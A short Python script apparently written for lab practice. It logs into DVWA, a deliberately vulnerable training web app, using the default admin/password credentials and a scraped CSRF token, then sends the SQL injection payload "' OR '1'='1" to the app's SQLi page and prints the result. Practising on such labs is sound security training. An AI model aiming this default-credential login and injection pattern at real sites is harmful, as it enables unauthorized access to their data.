import requests
from bs4 import BeautifulSoup

def login_to_dvwa(base_url):
    session = requests.Session()

    # Attempt to fetch the login page
    try:
        login_page = session.get(base_url + '/login.php')
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {base_url}: {e}")
        return None

    soup = BeautifulSoup(login_page.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']

    data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token
    }

    try:
        response = session.post(base_url + '/login.php', data=data)
    except requests.exceptions.RequestException as e:
        print(f"Error logging in: {e}")
        return None

    if 'Login failed' in response.text:
        print("Failed to login to DVWA.")
        return None

    return session.cookies.get('PHPSESSID')

def run_sql_injection_attack(dvwa_url):
    session_cookie = login_to_dvwa(dvwa_url)
    if not session_cookie:
        return

    target_url = f"{dvwa_url}/vulnerabilities/sqli/"
    headers = {'Cookie': f'PHPSESSID={session_cookie};'}

    sql_payload = "' OR '1'='1"
    params = {'id': sql_payload, 'Submit': 'Submit'}

    try:
        response = requests.get(target_url, params=params, headers=headers)
    except requests.exceptions.RequestException as e:
        print(f"Error during SQL injection attack: {e}")
        return

    print(response.text)